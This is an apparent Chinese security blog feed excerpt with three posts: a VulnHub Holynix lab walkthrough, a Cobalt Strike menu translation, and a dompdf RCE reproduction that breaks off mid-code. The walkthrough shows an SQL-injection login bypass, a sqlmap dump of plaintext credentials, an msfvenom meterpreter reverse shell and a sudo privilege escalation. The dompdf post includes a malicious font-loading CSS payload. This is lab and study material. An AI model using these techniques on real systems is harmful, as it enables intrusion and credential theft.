    <content type="html"><![CDATA[<p>download：<a href="https://www.vulnhub.com/entry/holynix-v1,20/">vulnhub</a></p><p>nmap扫一下：<code>192.168.188.138</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.188.138</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)</span><br><span class="line">MAC Address: 00:0C:29:BC:05:DE (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.24 - 2.6.25</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><p>万能密码：<code>1&#39; or 1=1#</code>登陆，</p><p>upload的时候应该是说这个用户没权限。</p><p>nikto看一下：</p><p><img src="/2022/03/28/VulnHub04/image-20220328170449034.png" alt="image-20220328170449034"></p><p>本地文件包含，在email那里，post直接发：</p><p><img src="/2022/03/28/VulnHub04/image-20220328170704211.png" alt="image-20220328170704211"></p><p><code>sqlmap -u http://192.168.188.138/index.php?page=login.php --forms --data=&quot;username=gmckinnon&quot; -dbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] clients</span><br><span class="line">[*] creds</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br></pre></td></tr></table></figure><p>tables:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[5 tables]</span><br><span class="line">+-------------+</span><br><span class="line">| accounts    |</span><br><span class="line">| blogs_table |</span><br><span class="line">| calender    |</span><br><span class="line">| employee    |</span><br><span class="line">| page        |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>dump:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Database: creds</span><br><span class="line">Table: accounts</span><br><span class="line">[11 entries]</span><br><span class="line">+-----+--------+--------------------+------------+</span><br><span class="line">| cid | upload | password           | username   |</span><br><span class="line">+-----+--------+--------------------+------------+</span><br><span class="line">| 1   | 0      | Ih@cK3dM1cR05oF7   | alamo      |</span><br><span class="line">| 2   | 1      | P3n7@g0n0wN3d      | etenenbaum |</span><br><span class="line">| 3   | 1      | d15cL0suR3Pr0J3c7  | gmckinnon  |</span><br><span class="line">| 4   | 1      | Ik1Ll3dNiN@r315er  | hreiser    |</span><br><span class="line">| 5   | 1      | p1@yIngW17hPh0n35  | jdraper    |</span><br><span class="line">| 6   | 1      | @rR35t3D@716       | jjames     |</span><br><span class="line">| 7   | 1      | m@k1nGb0o7L3g5     | jljohansen |</span><br><span class="line">| 8   | 1      | wH@7ar37H3Fed5D01n | kpoulsen   |</span><br><span class="line">| 9   | 0      | f@7H3r0FL1nUX      | ltorvalds  |</span><br><span class="line">| 10  | 1      | n@5aHaSw0rM5       | mrbutler   |</span><br><span class="line">| 11  | 1      | Myd@d51N7h3NSA     | rtmorris   |</span><br><span class="line">+-----+--------+--------------------+------------+</span><br></pre></td></tr></table></figure><p>msfvenom生成反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.188.129 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p>tar写为压缩文件然后上传，msf开监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.188.129</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure><p>进去之后不是root，接下来提权：</p><p>sudo -l看一下有那些命令可以root执行，然后将bash使用chown写为所有组为root，再放到xxx里面，提权成功。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">User www-data may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /bin/chown</span><br><span class="line">    (root) NOPASSWD: /bin/chgrp</span><br><span class="line">    (root) NOPASSWD: /bin/tar</span><br><span class="line">    (root) NOPASSWD: /bin/mv</span><br><span class="line">$ cp /bin/bash /tmp</span><br><span class="line">cp /bin/bash /tmp</span><br><span class="line">$ ls -l /tmp</span><br><span class="line">ls -l /tmp</span><br><span class="line">total 692</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 702160 Nov 18 10:59 bash</span><br><span class="line">$ sudo chown root:root /tmp/bash</span><br><span class="line">sudo chown root:root /tmp/bash</span><br><span class="line">$ sudo mv /tmp/bash /bin/tar</span><br><span class="line">sudo mv /tmp/bash /bin/tar</span><br><span class="line">$ sudo /bin/tar</span><br><span class="line">sudo /bin/tar</span><br><span class="line">root@holynix:/home/etenenbaum<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@holynix:/home/etenenbaum<span class="comment"># </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;download：&lt;a href=&quot;https://www.vulnhub.com/entry/holynix-v1,20/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;nmap扫一下：&lt;code&gt;192.168.188.138&lt;/code&gt;&lt;/p&gt;
&lt;figure class</summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/03/20/CSLearn/"/>
    <id>http://example.com/2022/03/20/CSLearn/</id>
    <published>2022-03-20T14:07:45.501Z</published>
    <updated>2022-03-20T15:51:29.200Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">agscript 拓展应用的脚本</span><br><span class="line">c2lint 用于检查profile的错误异常</span><br><span class="line">teamserver 服务端程序</span><br><span class="line">cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</span><br><span class="line">license.pdf 许可证文件</span><br><span class="line">logs 目录记录与目标主机的相关信息 </span><br><span class="line">update，update.jar用于更新CS </span><br><span class="line">third-party 第三方工具</span><br></pre></td></tr></table></figure><h1 id="2-安装运行"><a href="#2-安装运行" class="headerlink" title="2.安装运行"></a>2.安装运行</h1><p>。。。这个就不说了，在服务器上搞了半天，，也不知道为啥，，好像是java环境的问题，最后还是好了。。</p><h1 id="3-译"><a href="#3-译" class="headerlink" title="3.译"></a>3.译</h1><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">New Connection   # 新建连接，支持连接多个服务器端</span><br><span class="line">Preferences   # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</span><br><span class="line">Visualization   # 主要展示输出结果的视图</span><br><span class="line">VPN Interfaces   # 设置VPN接口</span><br><span class="line">Listenrs   # 创建监听器</span><br><span class="line">Script Manager   # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span><br><span class="line">Close   # 退出连接</span><br></pre></td></tr></table></figure><h2 id="view"><a href="#view" class="headerlink" title="view"></a>view</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Applications   # 显示受害主机的应用信息</span><br><span class="line">Credentials   # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz</span><br><span class="line">Downloads   # 查看已下载文件</span><br><span class="line">Event Log   # 主机上线记录以及团队协作聊天记录</span><br><span class="line">Keystrokes   # 查看键盘记录结果</span><br><span class="line">Proxy Pivots   # 查看代理模块</span><br><span class="line">Screenshots   # 查看所有屏幕截图</span><br><span class="line">Script Console   # 加载第三方脚本以增强功能 </span><br><span class="line">Targets   # 显示所有受害主机</span><br><span class="line">Web Log    # 所有Web服务的日志</span><br></pre></td></tr></table></figure><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="Packages"><a href="#Packages" class="headerlink" title="Packages"></a>Packages</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTML Application   # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件</span><br><span class="line">MS Office Macro   # 生成office宏病毒文件</span><br><span class="line">Payload Generator   # 生成各种语言版本的payload</span><br><span class="line">USB/CD AutoPlay   # 生成利用自动播放运行的木马文件</span><br><span class="line">Windows Dropper   # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)</span><br><span class="line">Windows Executable   # 生成可执行exe木马</span><br><span class="line">Windows Executable(Stageless)   # 生成无状态的可执行exe木马</span><br></pre></td></tr></table></figure><h3 id="Web-Drive-by"><a href="#Web-Drive-by" class="headerlink" title="Web Drive-by"></a>Web Drive-by</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Manage   # 对开启的web服务进行管理</span><br><span class="line">Clone Site   # 克隆网站，可以记录受害者提交的数据</span><br><span class="line">Host File   # 提供文件下载，可以选择Mime类型</span><br><span class="line">Scripted Web Delivery   # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery </span><br><span class="line">Signed Applet Attack   # 使用java自签名的程序进行钓鱼攻击(该方法已过时)</span><br><span class="line">Smart Applet Attack   # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)</span><br><span class="line">System Profiler   # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</span><br><span class="line">Spear Phish   # 鱼叉钓鱼邮件</span><br></pre></td></tr></table></figure><p><img src="/2022/03/20/CSLearn/201910241554298.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.新建连接</span><br><span class="line">2.断开当前连接</span><br><span class="line">3.监听器</span><br><span class="line">4.改变视图为Pivot Graph(视图列表)</span><br><span class="line">5.改变视图为Session Table(会话列表)</span><br><span class="line">6.改变视图为Target Table(目标列表)</span><br><span class="line">7.显示所有以获取的受害主机的凭证</span><br><span class="line">8.查看已下载文件</span><br><span class="line">9.查看键盘记录结果</span><br><span class="line">10.查看屏幕截图</span><br><span class="line">11.生成无状态的可执行exe木马</span><br><span class="line">12.使用java自签名的程序进行钓鱼攻击</span><br><span class="line">13.生成office宏病毒文件</span><br><span class="line">14.为payload提供web服务以便下载和执行</span><br><span class="line">15.提供文件下载，可以选择Mime类型</span><br><span class="line">16.管理Cobalt Strike上运行的web服务</span><br><span class="line">17.帮助</span><br><span class="line">18.关于</span><br></pre></td></tr></table></figure><h1 id="4-基本流程"><a href="#4-基本流程" class="headerlink" title="4.基本流程"></a>4.基本流程</h1><h2 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h2><p>cobalt strike=&gt;listeners=&gt;add，里面有9个Listener</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">indows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_http</span><br><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br><span class="line">windows/beacon_smb/bind_pipe</span><br><span class="line">windows/foreign/reverse_dns_txt</span><br><span class="line">windows/foreign/reverse_http</span><br><span class="line">windows/foreign/reverse_https</span><br><span class="line">windows/foreign/reverse_tcp</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-目录结构&quot;&gt;&lt;a href=&quot;#1-目录结构&quot; class=&quot;headerlink&quot; title=&quot;1.目录结构&quot;&gt;&lt;/a&gt;1.目录结构&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>dompdf 0day(RCE)复现</title>
    <link href="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-18T16:00:00.000Z</published>
    <updated>2022-03-19T03:29:49.855Z</updated>
    
    <content type="html"><![CDATA[<p>这次的漏洞是<code>dompdf</code>这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。</p><p>最开始这个漏洞并不是rce，而是xss。</p><p>首先是两个配置：</p><p>在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Enable embedded PHP</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* If this setting is set to true then DOMPDF will automatically evaluate</span></span><br><span class="line"><span class="comment">* embedded PHP contained within  ...  tags.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* ==== IMPORTANT ====</span></span><br><span class="line"><span class="comment">* Enabling this for documents you do not trust (e.g. arbitrary remote html</span></span><br><span class="line"><span class="comment">* pages) is a security risk. Embedded scripts are run with the same level of</span></span><br><span class="line"><span class="comment">* system access available to dompdf. Set this option to false (recommended)</span></span><br><span class="line"><span class="comment">* if you wish to process untrusted documents.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* This setting may increase the risk of system exploit. Do not change</span></span><br><span class="line"><span class="comment">* this settings without understanding the consequences. Additional</span></span><br><span class="line"><span class="comment">* documentation is available on the dompdf wiki at:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$isPhpEnabled</span> = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>远程资源加载：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Enable remote file access</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* If this setting is set to true, DOMPDF will access remote sites for</span></span><br><span class="line"><span class="comment">* images and CSS files as required.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* ==== IMPORTANT ====</span></span><br><span class="line"><span class="comment">* This can be a security risk, in particular in combination with isPhpEnabled and</span></span><br><span class="line"><span class="comment">* allowing remote html code to be passed to $dompdf = new DOMPDF(); $dompdf-&gt;load_html(...);</span></span><br><span class="line"><span class="comment">* This allows anonymous users to download legally doubtful internet content which on</span></span><br><span class="line"><span class="comment">* tracing back appears to being downloaded by your server, or allows malicious php code</span></span><br><span class="line"><span class="comment">* in remote html pages to be executed by your server with your account privileges.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* This setting may increase the risk of system exploit. Do not change</span></span><br><span class="line"><span class="comment">* this settings without understanding the consequences. Additional</span></span><br><span class="line"><span class="comment">* documentation is available on the dompdf wiki at:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$isRemoteEnabled</span> = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>查看这个是否开启可以xss构造：<code>?t=aa&lt;link rel=stylesheet href=&quot;xxxxxxx/test.css&quot;&gt;&amp;pdf</code>，来包含一个外部css，判断这个选项是否开启。</p><p>若开启，dompdf即允许通过font-face 的css来加载自定义的字体。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;exploitfont&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;http://localhost:9001/xxxx.ttf&#x27;</span>);</span><br><span class="line">    <span class="attribute">font-weight</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">    <span class="attribute">font-style</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>使用外部字体的时候，dompdf将其存在<code>/lib/fonts</code>的目录中，并在<code>dompdf_font_family_cache.php</code>using中添加相应的条目<code>saveFontFamilies()</code>，这个函数将 dompdf 已知的字体编码为 PHP 数组，以及稍后查找它们所需的信息。：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Saves the stored font family cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The name and location of the cache file are determined by &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment"> * FontMetrics::CACHE_FILE&#125;. This file should be writable by the</span></span><br><span class="line"><span class="comment"> * webserver process.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> FontMetrics::loadFontFamilies()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveFontFamilies</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// replace the path to the DOMPDF font directories with the corresponding constants (allows for more portability)</span></span><br><span class="line">    <span class="variable">$cacheData</span> = sprintf(<span class="string">&quot;&lt;?php return function (%s, %s) &#123;%s&quot;</span>, <span class="string">&#x27;$fontDir&#x27;</span>, <span class="string">&#x27;$rootDir&#x27;</span>, PHP_EOL);</span><br><span class="line">    <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;return array (%s&quot;</span>, PHP_EOL);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;fontLookup <span class="keyword">as</span> <span class="variable">$family</span> =&gt; <span class="variable">$variants</span>) &#123;</span><br><span class="line">        <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;  &#x27;%s&#x27; =&gt; array(%s&quot;</span>, addslashes(<span class="variable">$family</span>), PHP_EOL);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$variants</span> <span class="keyword">as</span> <span class="variable">$variant</span> =&gt; <span class="variable">$path</span>) &#123;</span><br><span class="line">            <span class="variable">$path</span> = sprintf(<span class="string">&quot;&#x27;%s&#x27;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$path</span> = str_replace(<span class="string">&#x27;\&#x27;&#x27;</span> . <span class="keyword">$this</span>-&gt;options-&gt;getFontDir(), <span class="string">&#x27;$fontDir . \&#x27;&#x27;</span>, <span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$path</span> = str_replace(<span class="string">&#x27;\&#x27;&#x27;</span> . <span class="keyword">$this</span>-&gt;options-&gt;getRootDir(), <span class="string">&#x27;$rootDir . \&#x27;&#x27;</span>, <span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;    &#x27;%s&#x27; =&gt; %s,%s&quot;</span>, <span class="variable">$variant</span>, <span class="variable">$path</span>, PHP_EOL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;  ),%s&quot;</span>, PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$cacheData</span> .= <span class="string">&quot;);&quot;</span> . PHP_EOL;</span><br><span class="line">    <span class="variable">$cacheData</span> .= <span class="string">&quot;&#125;; ?&gt;&quot;</span>;</span><br><span class="line">    file_put_contents(<span class="keyword">$this</span>-&gt;getCacheFile(), <span class="variable">$cacheData</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不能使用字体缓存索引，直接使用字体缓存是否可行？看下dompdf如何如何注册新字体(部分，具体在<a href="https://github.com/dompdf/dompdf/blob/v1.2.0/src/FontMetrics.php#L174">这里</a>)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $style</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $remoteFile</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> resource $context</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerFont</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$remoteFile</span>, <span class="variable">$context</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="variable">$fontname</span> = mb_strtolower(<span class="variable">$style</span>[<span class="string">&quot;family&quot;</span>]);</span><br><span class="line">   <span class="variable">$styleString</span> = <span class="keyword">$this</span>-&gt;getType(<span class="string">&quot;<span class="subst">&#123;$style[&#x27;weight&#x27;]&#125;</span> <span class="subst">&#123;$style[&#x27;style&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$fontDir</span> = <span class="keyword">$this</span>-&gt;options-&gt;getFontDir();</span><br><span class="line">   <span class="variable">$remoteHash</span> = md5(<span class="variable">$remoteFile</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$prefix</span> = <span class="variable">$fontname</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$styleString</span>;</span><br><span class="line">   <span class="variable">$prefix</span> = preg_replace(<span class="string">&quot;[\\W]&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$prefix</span>);</span><br><span class="line">   <span class="variable">$prefix</span> = preg_replace(<span class="string">&quot;/[^-_\\w]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$prefix</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$localFile</span> = <span class="variable">$fontDir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$prefix</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$remoteHash</span>;</span><br><span class="line">   <span class="variable">$localFile</span> .= <span class="string">&quot;.&quot;</span>.strtolower(pathinfo(parse_url(<span class="variable">$remoteFile</span>, PHP_URL_PATH), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Download the remote file</span></span><br><span class="line">   <span class="keyword">list</span>(<span class="variable">$remoteFileContent</span>, <span class="variable">$http_response_header</span>) = @Helpers::getFileContent(<span class="variable">$remoteFile</span>, <span class="variable">$context</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$localTempFile</span> = @tempnam(<span class="keyword">$this</span>-&gt;options-&gt;get(<span class="string">&quot;tempDir&quot;</span>), <span class="string">&quot;dompdf-font-&quot;</span>);</span><br><span class="line">   file_put_contents(<span class="variable">$localTempFile</span>, <span class="variable">$remoteFileContent</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$font</span> = Font::load(<span class="variable">$localTempFile</span>);</span><br><span class="line"></span><br><span class="line">   <span 